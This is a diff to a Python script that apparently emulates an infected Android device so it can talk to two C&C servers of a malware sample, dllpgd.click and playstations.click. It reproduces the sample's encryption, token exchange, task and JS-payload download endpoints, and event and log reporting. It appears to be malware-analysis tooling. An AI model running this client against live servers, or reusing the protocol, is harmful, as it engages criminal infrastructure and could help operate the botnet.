@@ -657,9 +657,9 @@ update_log_payload = {
 }
 log_result = send_request("updateLog", update_log_payload)
 
-# Summary
+# Summary for dllpgd.click
 print("\n" + "=" * 70)
-print("  Summary")
+print("  Summary — dllpgd.click (C&C Config Server)")
 print("=" * 70)
 print(f"  Server:      {BASE_URL}")
 print(f"  AES Key:     {AES_KEY_SEED} → MD5 → {md5_hash}")
@@ -669,3 +669,424 @@ print(f"               {API_UPDATE_LOG}")
 print(f"  getConfig:   {'OK' if config_result else 'FAILED/UNREACHABLE'}")
 print(f"  updateEvent: {'OK' if event_result else 'FAILED/UNREACHABLE'}")
 print(f"  updateLog:   {'OK' if log_result else 'FAILED/UNREACHABLE'}")
+
+
+# ============================================================
+# 6. playstations.click — C&C API Server
+# ============================================================
+
+print("\n\n" + "=" * 70)
+print("  playstations.click — C&C API Server")
+print("=" * 70)
+
+PS_BASE_URL = "https://playstations.click"
+
+# --- XOR encryption for HttpClient request/response body ---
+def xor_encrypt(data: bytes, key: bytes) -> bytes:
+    """XOR encrypt data with repeating key (mirrors HttpClient XOR+Base64)"""
+    result = bytearray(len(data))
+    for i in range(len(data)):
+        result[i] = data[i] ^ key[i % len(key)]
+    return bytes(result)
+
+xor_decrypt_body = xor_encrypt  # XOR is symmetric
+
+
+# --- Build DeviceFingerprint (model/DeviceFingerprint.java) ---
+def build_device_fingerprint(app_id: str, dev_id: str) -> dict:
+    """
+    Builds a DeviceFingerprint matching DeviceFingerprint.toJSONObject().
+    15 fields covering device identity, screen metrics, locale, system info.
+    """
+    return {
+        "device_id": dev_id,
+        "app_package": app_id,
+        "app_version": "14",
+        "session_id": uuid.uuid4().hex,
+        "channel": "tc",                           # hardcoded in collectFromDevice()
+        "timezone": "Asia/Shanghai",
+        "locale": "zh_CN",
+        "model": "Pixel 6",
+        "brand": "google",
+        "screen_resolution": "1080*2400",
+        "screen_density": "420dpi",
+        "orientation": "portrait",
+        "android_version": "14",
+        "timestamp_now": int(time.time() * 1000),
+        "network_type": "wifi",
+    }
+
+
+# --- Build DeviceAuthRequest (model/DeviceAuthRequest.java) ---
+def build_device_auth_request(app_id: str, dev_id: str, token: str = "") -> dict:
+    """
+    Builds a DeviceAuthRequest matching DeviceAuthRequest.toJSONObject().
+    JSON keys: app_id, device_id, token, atom
+    """
+    return {
+        "app_id": app_id,
+        "device_id": dev_id,
+        "token": token,
+        "atom": build_device_fingerprint(app_id, dev_id),
+    }
+
+
+# --- API endpoint definitions ---
+PS_ENDPOINTS = {
+    "getToken":       "/phantom/token",
+    "getTaskConfig":  "/phantom/task",
+    "getFileVersion": "/phantom/file_version",
+    "getFileContent": "/phantom/file",
+    "reportDone":     "/phantom/done",
+    "uploadLogs":     "/h5/upload_logs_v2",
+    "getSignalingJS": "/h5/js_file_for_signaling",
+    "getJobByOffer":  "/h5/get_job_by_offer",
+    "reportEvents":   "/h5/report_events",
+}
+
+print(f"\n[Base URL] {PS_BASE_URL}")
+print(f"\n[API Endpoints]")
+for name, path in PS_ENDPOINTS.items():
+    print(f"  {name:20s} → {PS_BASE_URL}{path}")
+
+
+# --- Common request parameters ---
+APP_ID = "com.android.wallpaper"              # host app package name (disguised)
+DEVICE_ID = uuid.uuid4().hex[:16]             # random device ID
+PS_USER_AGENT = "MyApp/1.0 (Linux; Android 14; Pixel 6) DPI/420"
+                                               # mirrors PreferencesHelper.buildUserAgent()
+
+print(f"\n[Device Params]")
+print(f"  app_id:     {APP_ID}")
+print(f"  device_id:  {DEVICE_ID}")
+print(f"  User-Agent: {PS_USER_AGENT}")
+
+
+def send_ps_request(api_name: str, payload: dict, encryption_key: bytes = None,
+                    timeout: int = 15) -> dict:
+    """
+    Send request to playstations.click API server.
+
+    Encryption flow (HttpClient.java):
+      If encryptionKey is set:
+        Request:  JSON string → XOR(bytes, key) → Base64 encode → send
+        Response: receive → Base64 decode → XOR(bytes, key) → JSON parse
+      If encryptionKey is null:
+        Plain JSON request/response
+    """
+    url = PS_BASE_URL + PS_ENDPOINTS[api_name]
+
+    # Serialize JSON body
+    json_body = json.dumps(payload, separators=(',', ':'), ensure_ascii=False)
+
+    # Optionally encrypt
+    if encryption_key:
+        encrypted_bytes = xor_encrypt(json_body.encode('utf-8'), encryption_key)
+        body = base64.b64encode(encrypted_bytes).decode('ascii')
+    else:
+        body = json_body
+
+    req_headers = {
+        "Content-Type": "application/json; charset=utf-8",
+        "Accept": "application/json",
+        "User-Agent": PS_USER_AGENT,
+    }
+
+    print(f"\n{'─' * 60}")
+    print(f"  [{api_name}] → {url}")
+    print(f"  Body length: {len(body)} chars")
+    if encryption_key:
+        print(f"  Encryption: XOR+Base64 (key={len(encryption_key)} bytes)")
+    else:
+        print(f"  Encryption: None (plaintext JSON)")
+    print(f"{'─' * 60}")
+    print(f"  [Request JSON]")
+    print(f"  {json.dumps(payload, indent=2, ensure_ascii=False)[:500]}")
+
+    try:
+        resp = requests.post(
+            url, data=body.encode('utf-8'),
+            headers=req_headers, timeout=timeout, verify=True
+        )
+        print(f"\n  HTTP Status: {resp.status_code}")
+        print(f"  Response Headers:")
+        for k, v in resp.headers.items():
+            print(f"    {k}: {v}")
+
+        if resp.status_code >= 200 and resp.status_code <= 299:
+            response_text = resp.text
+
+            # Try to decrypt if encryption key is set
+            if encryption_key and response_text:
+                try:
+                    decoded = base64.b64decode(response_text)
+                    decrypted = xor_decrypt_body(decoded, encryption_key)
+                    response_text = decrypted.decode('utf-8')
+                    print(f"  [Decrypted Response]")
+                except Exception as e:
+                    print(f"  [Decryption failed: {e}, trying plaintext]")
+
+            # Parse JSON
+            try:
+                result = json.loads(response_text)
+                print(f"  [Response JSON]")
+                print(f"  {json.dumps(result, indent=2, ensure_ascii=False)}")
+                return result
+            except json.JSONDecodeError:
+                print(f"  [Raw Response] {response_text[:500]}")
+                return {"raw": response_text[:500]}
+        else:
+            print(f"  [Error Response] {resp.text[:500]}")
+            return {"error": resp.status_code, "body": resp.text[:500]}
+
+    except requests.exceptions.Timeout:
+        print(f"  [TIMEOUT] Server did not respond within {timeout}s")
+        return None
+    except requests.exceptions.SSLError as e:
+        print(f"  [SSL ERROR] {e}")
+        # Retry with HTTP
+        print(f"  Retrying with HTTP...")
+        try:
+            http_url = url.replace("https://", "http://")
+            resp = requests.post(
+                http_url, data=body.encode('utf-8'),
+                headers=req_headers, timeout=timeout
+            )
+            print(f"  HTTP Status: {resp.status_code}")
+            if resp.status_code >= 200 and resp.status_code <= 299:
+                try:
+                    result = json.loads(resp.text)
+                    print(f"  [Response JSON] {json.dumps(result, indent=2, ensure_ascii=False)}")
+                    return result
+                except json.JSONDecodeError:
+                    print(f"  [Raw Response] {resp.text[:500]}")
+            else:
+                print(f"  [Error Response] {resp.text[:500]}")
+            return {"error": resp.status_code, "body": resp.text[:500]}
+        except Exception as e2:
+            print(f"  [HTTP FALLBACK FAILED] {e2}")
+            return None
+    except requests.exceptions.ConnectionError as e:
+        print(f"  [CONNECTION ERROR] {e}")
+        return None
+    except Exception as e:
+        print(f"  [ERROR] {type(e).__name__}: {e}")
+        return None
+
+
+# ============================================================
+# 7. Execute playstations.click API Calls
+# ============================================================
+
+print("\n" + "=" * 70)
+print("  playstations.click API Call Results")
+print("=" * 70)
+
+# Track state across calls
+ps_auth_token = ""
+ps_encryption_key = None     # set dynamically from token response
+ps_offer_id = ""
+ps_job_id = ""
+
+# --- 1. POST /phantom/token — Device Authentication ---
+print("\n" + "─" * 30)
+print("  [1/9] POST /phantom/token")
+print("─" * 30)
+
+token_request = build_device_auth_request(APP_ID, DEVICE_ID)
+token_result = send_ps_request("getToken", token_request)
+
+if token_result and isinstance(token_result, dict):
+    ps_auth_token = token_result.get("content", "")
+    code = token_result.get("code", -1)
+    print(f"\n  → code: {code}")
+    print(f"  → token: {ps_auth_token[:50]}{'...' if len(ps_auth_token) > 50 else ''}")
+
+    # Check if there's an encryption key in the response
+    enc_key_b64 = token_result.get("encryption_key", "")
+    if enc_key_b64:
+        ps_encryption_key = base64.b64decode(enc_key_b64)
+        print(f"  → encryption_key set ({len(ps_encryption_key)} bytes)")
+
+# --- 2. POST /phantom/task — Get Task Configuration ---
+print("\n" + "─" * 30)
+print("  [2/9] POST /phantom/task")
+print("─" * 30)
+
+task_request = build_device_auth_request(APP_ID, DEVICE_ID, ps_auth_token)
+task_result = send_ps_request("getTaskConfig", task_request, ps_encryption_key)
+
+if task_result and isinstance(task_result, dict):
+    task_content = task_result.get("task", "")
+    print(f"\n  → code: {task_result.get('code', -1)}")
+    print(f"  → task content length: {len(task_content)} chars")
+    if task_content:
+        print(f"  → task preview: {task_content[:200]}...")
+
+# --- 3. POST /phantom/file_version — Check JS File Version ---
+print("\n" + "─" * 30)
+print("  [3/9] POST /phantom/file_version")
+print("─" * 30)
+
+version_request = build_device_auth_request(APP_ID, DEVICE_ID, ps_auth_token)
+version_result = send_ps_request("getFileVersion", version_request, ps_encryption_key)
+
+if version_result and isinstance(version_result, dict):
+    print(f"\n  → code: {version_result.get('code', -1)}")
+    print(f"  → version: {version_result.get('version', 'N/A')}")
+
+# --- 4. POST /phantom/file — Download JS File Content ---
+print("\n" + "─" * 30)
+print("  [4/9] POST /phantom/file")
+print("─" * 30)
+
+file_request = build_device_auth_request(APP_ID, DEVICE_ID, ps_auth_token)
+file_result = send_ps_request("getFileContent", file_request, ps_encryption_key)
+
+if file_result and isinstance(file_result, dict):
+    file_content = file_result.get("content", "")
+    print(f"\n  → code: {file_result.get('code', -1)}")
+    print(f"  → JS file length: {len(file_content)} chars")
+    if file_content:
+        print(f"  → JS preview: {file_content[:200]}...")
+
+# --- 5. POST /h5/js_file_for_signaling — Get Signaling JS ---
+print("\n" + "─" * 30)
+print("  [5/9] POST /h5/js_file_for_signaling")
+print("─" * 30)
+
+signaling_js_request = {
+    "offer": ps_offer_id or "test_offer_001",
+    "token": ps_auth_token,
+    "app_id": APP_ID,
+    "device_id": DEVICE_ID,
+    "platform": "tc",
+    "atom": build_device_fingerprint(APP_ID, DEVICE_ID),
+}
+signaling_js_result = send_ps_request("getSignalingJS", signaling_js_request, ps_encryption_key)
+
+# --- 6. POST /h5/get_job_by_offer — Get Job By Offer ---
+print("\n" + "─" * 30)
+print("  [6/9] POST /h5/get_job_by_offer")
+print("─" * 30)
+
+job_request = {
+    "api_key": ps_auth_token,
+    "offer_id": ps_offer_id or "test_offer_001",
+    "token": ps_auth_token,
+    "app_id": APP_ID,
+    "device_id": DEVICE_ID,
+    "platform": "tc",
+    "atom": build_device_fingerprint(APP_ID, DEVICE_ID),
+}
+job_result = send_ps_request("getJobByOffer", job_request, ps_encryption_key)
+
+if job_result and isinstance(job_result, dict):
+    task_data = job_result.get("task", "")
+    print(f"\n  → code: {job_result.get('code', -1)}")
+    if task_data:
+        # task_data may contain site_url, job_id, offer_id
+        try:
+            offer_data = json.loads(task_data) if isinstance(task_data, str) else task_data
+            print(f"  → site_url: {offer_data.get('site_url', 'N/A')}")
+            print(f"  → job_id: {offer_data.get('job_id', 'N/A')}")
+            print(f"  → offer_id: {offer_data.get('offer_id', 'N/A')}")
+            ps_offer_id = offer_data.get("offer_id", ps_offer_id)
+            ps_job_id = offer_data.get("job_id", ps_job_id)
+        except (json.JSONDecodeError, AttributeError):
+            print(f"  → task: {str(task_data)[:200]}")
+
+# --- 7. POST /h5/report_events — Report Events ---
+print("\n" + "─" * 30)
+print("  [7/9] POST /h5/report_events")
+print("─" * 30)
+
+events_request = {
+    "token": ps_auth_token,
+    "app_id": APP_ID,
+    "device_id": DEVICE_ID,
+    "platform": "tc",
+    "api_key": ps_auth_token,
+    "offer_id": ps_offer_id or "test_offer_001",
+    "events": [
+        json.dumps({"name": "sdk_init", "desc": "SDK initialized", "timestamp": int(time.time() * 1000)}),
+        json.dumps({"name": "page_loaded", "desc": "Landing page loaded", "timestamp": int(time.time() * 1000)}),
+    ],
+    "atom": build_device_fingerprint(APP_ID, DEVICE_ID),
+}
+events_result = send_ps_request("reportEvents", events_request, ps_encryption_key)
+
+# --- 8. POST /h5/upload_logs_v2 — Upload Logs ---
+print("\n" + "─" * 30)
+print("  [8/9] POST /h5/upload_logs_v2")
+print("─" * 30)
+
+logs_request = {
+    "token": ps_auth_token,
+    "app_id": APP_ID,
+    "device_id": DEVICE_ID,
+    "platform": "tc",
+    "api_key": ps_auth_token,
+    "offer_id": ps_offer_id or "test_offer_001",
+    "events": [   # field is "events" in LogUploadRequest too
+        json.dumps({"level": 1, "tag": "[Dllpgd][HR]", "message": "task started", "timestamp": int(time.time() * 1000)}),
+    ],
+    "atom": build_device_fingerprint(APP_ID, DEVICE_ID),
+}
+logs_result = send_ps_request("uploadLogs", logs_request, ps_encryption_key)
+
+# --- 9. POST /phantom/done — Report Task Done ---
+print("\n" + "─" * 30)
+print("  [9/9] POST /phantom/done")
+print("─" * 30)
+
+done_request = {
+    "app_id": APP_ID,
+    "device_id": DEVICE_ID,
+    "token": ps_auth_token,
+    "api_key": ps_auth_token,
+    "offer_id": ps_offer_id or "test_offer_001",
+    "result": "success",
+    "atom": build_device_fingerprint(APP_ID, DEVICE_ID),
+}
+done_result = send_ps_request("reportDone", done_request, ps_encryption_key)
+
+
+# ============================================================
+# 8. Final Summary
+# ============================================================
+
+print("\n\n" + "=" * 70)
+print("  Final Summary")
+print("=" * 70)
+
+print(f"\n  ── dllpgd.click (C&C Config Server) ──")
+print(f"  Server:      {BASE_URL}")
+print(f"  Encryption:  AES-256-CFB (5-layer pipeline)")
+print(f"  AES Key:     {AES_KEY_SEED} → MD5 → {md5_hash}")
+print(f"  Endpoints:   {API_GET_CONFIG}")
+print(f"               {API_UPDATE_EVENT}")
+print(f"               {API_UPDATE_LOG}")
+print(f"  getConfig:   {'OK' if config_result else 'FAILED/UNREACHABLE'}")
+print(f"  updateEvent: {'OK' if event_result else 'FAILED/UNREACHABLE'}")
+print(f"  updateLog:   {'OK' if log_result else 'FAILED/UNREACHABLE'}")
+
+print(f"\n  ── playstations.click (C&C API Server) ──")
+print(f"  Server:      {PS_BASE_URL}")
+print(f"  Encryption:  XOR+Base64 (dynamic key from token response)")
+print(f"  User-Agent:  {PS_USER_AGENT}")
+ps_results = {
+    "getToken": token_result,
+    "getTaskConfig": task_result,
+    "getFileVersion": version_result,
+    "getFileContent": file_result,
+    "getSignalingJS": signaling_js_result,
+    "getJobByOffer": job_result,
+    "reportEvents": events_result,
+    "uploadLogs": logs_result,
+    "reportDone": done_result,
+}
+for name, result in ps_results.items():
+    status = "OK" if result and not (isinstance(result, dict) and result.get("error")) else "FAILED/UNREACHABLE"
+    endpoint = PS_ENDPOINTS[name]
+    print(f"  {name:20s} {endpoint:35s} {status}")
